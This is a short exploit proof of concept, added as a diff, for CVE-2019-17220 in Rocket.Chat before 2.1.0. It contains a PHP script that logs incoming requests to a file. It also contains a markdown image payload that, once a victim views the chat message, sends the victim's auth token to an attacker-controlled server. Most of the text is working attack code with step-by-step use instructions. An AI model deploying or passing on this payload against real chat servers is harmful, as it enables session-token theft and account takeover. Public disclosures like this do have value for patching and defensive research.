@@ -1,0 +1,25 @@
+# Title: Rocket.Chat 2.1.0 - Cross-Site Scripting
+# Author: 3H34N
+# Date: 2019-10-22
+# Product: Rocket.Chat
+# Vendor: https://rocket.chat/
+# Vulnerable Version(s): Rocket.Chat < 2.1.0
+# CVE: CVE-2019-17220
+# Special Thanks : Ali razmjoo, Mohammad Reza Espargham (@rezesp)
+
+# PoC
+# 1. Create l33t.php on a web server
+
+<?php
+$output = fopen("logs.txt", "a+") or die("WTF? o.O");
+$leet = $_GET['leet']."\n\n";
+fwrite($output, $leet);
+fclose($output);
+?>
+
+# 2. Open a chat session
+# 3. Send payload with your web server url
+
+![title](http://10.10.1.5/l33t.php?leet=+`{}token`)
+
+# 4. Token will be written in logs.txt when target seen your message.
